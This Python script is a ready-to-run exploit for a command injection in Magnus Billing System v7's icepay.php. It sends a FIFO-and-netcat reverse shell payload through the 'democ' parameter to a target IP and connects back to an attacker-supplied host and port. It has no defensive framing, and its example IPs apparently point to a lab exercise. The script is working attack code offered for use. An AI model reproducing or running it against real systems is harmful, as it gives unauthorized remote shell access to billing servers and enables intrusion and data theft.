#!/usr/bin/env python3

import requests
import argparse
import sys

def parse_arguments():
    """Parse command-line arguments for target IP, attacker IP, and port."""
    parser = argparse.ArgumentParser(
        description="Exploit for Magnus Billing System v7 - Command Injection in icepay.php",
        epilog="Example: python exploit.py -t 10.10.160.86 -a 10.8.64.79 -p 443"
    )
    parser.add_argument(
        "-t", "--target",
        required=True,
        help="Target IP address hosting Magnus Billing System"
    )
    parser.add_argument(
        "-a", "--attacker",
        required=True,
        help="Attacker IP address to receive the reverse shell"
    )
    parser.add_argument(
        "-p", "--port",
        required=True,
        type=int,
        help="Attacker port to receive the reverse shell"
    )
    return parser.parse_args()

def craft_payload(attacker_ip, attacker_port):
    """Craft the command injection payload for the reverse shell."""
    # Payload mimics the curl command: creates a FIFO, sets up a reverse shell with netcat
    payload = (
        ";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc "
        f"{attacker_ip} {attacker_port} >/tmp/f;"
    )
    return payload

def exploit(target_ip, attacker_ip, attacker_port):
    """Send the exploit request to the target and attempt to trigger the reverse shell."""
    url = f"http://{target_ip}/mbilling/lib/icepay/icepay.php"
    payload = craft_payload(attacker_ip, attacker_port)
    params = {"democ": payload}

    print(f"[+] Targeting: {url}")
    print(f"[+] Attacker: {attacker_ip}:{attacker_port}")
    print(f"[+] Sending payload: {payload}")

    try:
        # Send GET request with the payload, suppressing output like curl -s
        response = requests.get(url, params=params, timeout=5)
        # Since this is a reverse shell exploit, we won't get meaningful response content
        print("[+] Request sent successfully!")
        print("[*] Check your netcat listener (e.g., 'nc -lvnp {port}') for a shell.")
    except requests.RequestException as e:
        print(f"[-] Error connecting to target: {e}")
        sys.exit(1)

def main():
    """Main function to orchestrate the exploit."""
    print("=== Magnus Billing System v7 Exploit by Tinashe Matanda(SadNinja) ===")
    print("Command Injection via icepay.php - Reverse Shell")
    print("=======================================")

    # Parse arguments
    args = parse_arguments()

    # Validate port range
    if not (1 <= args.port <= 65535):
        print(f"[-] Error: Port {args.port} is out of valid range (1-65535)")
        sys.exit(1)

    # Execute the exploit
    exploit(args.target, args.attacker, args.port)

if __name__ == "__main__":
    main()
